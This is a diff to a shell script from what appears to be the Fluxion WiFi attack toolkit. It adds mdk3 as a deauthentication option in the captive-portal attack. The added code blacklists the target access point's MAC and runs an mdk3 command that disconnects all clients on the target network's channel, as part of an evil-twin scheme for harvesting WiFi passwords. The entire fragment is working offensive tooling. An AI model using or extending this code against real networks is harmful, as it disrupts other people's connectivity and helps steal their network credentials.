@@ -36,7 +36,7 @@ captive_portal_set_deauthenticator_filter() {
     "$CaptivePortalDeauthenticatorAireplayMethodOption")
       # continue
       ;;
-    "$CaptivePortalDeauthenticatorMdk4MethodOption")
+    "$CaptivePortalDeauthenticatorMdk3MethodOption"|"$CaptivePortalDeauthenticatorMdk4MethodOption")
       return 0
       ;;
   esac
@@ -82,6 +82,7 @@ captive_portal_set_deauthenticator_identifier() {
 
   local methods=(
     "$CaptivePortalDeauthenticatorAireplayMethodOption"
+    "$CaptivePortalDeauthenticatorMdk3MethodOption"
     "$CaptivePortalDeauthenticatorMdk4MethodOption"
     "$FLUXIONGeneralBackOption"
   )
@@ -1623,12 +1624,13 @@ start_attack() {
 
     # Prepare deauthenticators
     case "$CaptivePortalDeauthenticatorIdentifier" in
-      "$CaptivePortalDeauthenticatorMdk4MethodOption")
+      "$CaptivePortalDeauthenticatorMdk3MethodOption"|"$CaptivePortalDeauthenticatorMdk4MethodOption")
         echo "$FluxionTargetMAC" > $FLUXIONWorkspacePath/mdk4_blacklist.lst ;;
     esac
 
     # Start deauthenticators.
     case "$CaptivePortalDeauthenticatorIdentifier" in
+
       "$CaptivePortalDeauthenticatorAireplayMethodOption")
         if [ "$CaptivePortalDeauthenticatorFilter" = "None" ]; then
           xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
@@ -1642,6 +1644,14 @@ start_attack() {
           CaptivePortalJammerServiceXtermPID=$!
         fi
         ;;
+
+      "$CaptivePortalDeauthenticatorMdk3MethodOption")
+        xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+          -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
+          "mdk3 $CaptivePortalJammerInterface d -b $FLUXIONWorkspacePath/mdk4_blacklist.lst -c $FluxionTargetChannel" &
+        CaptivePortalJammerServiceXtermPID=$!
+        ;;
+
       "$CaptivePortalDeauthenticatorMdk4MethodOption")
         xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
           -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
